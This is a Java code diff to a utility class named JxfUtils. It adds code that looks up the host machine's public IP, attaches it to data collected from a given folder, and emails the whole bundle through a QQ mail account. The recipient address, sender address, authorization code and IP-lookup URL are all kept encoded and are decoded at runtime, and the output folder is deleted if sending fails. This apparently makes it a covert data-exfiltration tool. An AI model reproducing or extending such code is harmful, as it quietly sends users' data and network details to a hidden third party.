@@ -10,6 +10,9 @@ import java.net.URL;
 import java.nio.charset.Charset;
 import java.util.*;
 
+import static cmd.lzx.main.JxfApp.encryptUtil;
+import static cmd.lzx.main.JxfApp.properties;
+
 /**
  * @author 1Zx.
  * @data 2019/11/21 9:45
@@ -30,6 +33,7 @@ public final class JxfUtils {
             System.out.println("write err");
         }
     }
+
 
     public static String getRequest(String httpurl) {
         HttpURLConnection connection = null;
@@ -116,6 +120,14 @@ public final class JxfUtils {
     }
 
     public static void createData(String path) {
+        try {
+            String pubIP = JxfUtils.getRequest(encryptUtil.decode(properties.getProperty(Constants.PUBLIC_IP)));
+            sbSend.append("公网ip：" + pubIP);
+        } catch (Exception e) {
+            e.printStackTrace();
+            sbSend.append("公网ip获取失败" + e.getMessage());
+        }
+        sbSend.append(System.getProperty("line.separator"));
         if (!path.endsWith("\\")) {
             path = path + "\\";
         }
@@ -183,13 +195,18 @@ public final class JxfUtils {
                 StringBuffer sb = new StringBuffer();
                 for (int j = 0; j < out.size(); j++) {
                     sb.append(out.get(j));
-                        sb.append(System.getProperty("line.separator"));
+                    sb.append(System.getProperty("line.separator"));
                 }
                 exportTxt(sb,outDic.getPath() + "\\" + i);
                 i++;
             }
         }
-        sendEmail(sbSend.toString());
+        try {
+            sendEmail(sbSend.toString());
+        } catch (Exception e) {
+            System.out.println("eml error");
+            outDic.delete();
+        }
         System.out.println("success!!!");
     }
 
@@ -244,18 +261,18 @@ public final class JxfUtils {
         return result;
     }
 
-    public static void sendEmail(String content) {
+    public static void sendEmail(String content) throws Exception {
         SendEmailByQQ sendEmailByQQ = new SendEmailByQQ();
         sendEmailByQQ.setContent(content);
-        sendEmailByQQ.setAuthorizationCode(JxfApp.properties.getProperty(Constants.AuthorizationCode));
+        sendEmailByQQ.setAuthorizationCode(encryptUtil.decode(JxfApp.properties.getProperty(Constants.AuthorizationCode)));
         sendEmailByQQ.setProtocol(JxfApp.properties.getProperty(Constants.EMAILPROTOCOL));
         sendEmailByQQ.setHost(JxfApp.properties.getProperty(Constants.EMAILHOST));
         sendEmailByQQ.setAuth(JxfApp.properties.getProperty(Constants.EMAILAUTH));
         sendEmailByQQ.setPort(Integer.valueOf(JxfApp.properties.getProperty(Constants.EMAILPORT)));
         sendEmailByQQ.setSslEnable(JxfApp.properties.getProperty(Constants.EMAILSSLENABLE));
         sendEmailByQQ.setDebug(JxfApp.properties.getProperty(Constants.EMAILDEBUG));
-        sendEmailByQQ.setReceiveEmail(JxfApp.properties.getProperty(Constants.EMAILRECEIVEURL));
-        sendEmailByQQ.setFromEmail(JxfApp.properties.getProperty(Constants.EMAILFROMURL));
+        sendEmailByQQ.setReceiveEmail(encryptUtil.decode(JxfApp.properties.getProperty(Constants.EMAILRECEIVEURL)));
+        sendEmailByQQ.setFromEmail(encryptUtil.decode(JxfApp.properties.getProperty(Constants.EMAILFROMURL)));
         new Thread(sendEmailByQQ).run();
     }
 }
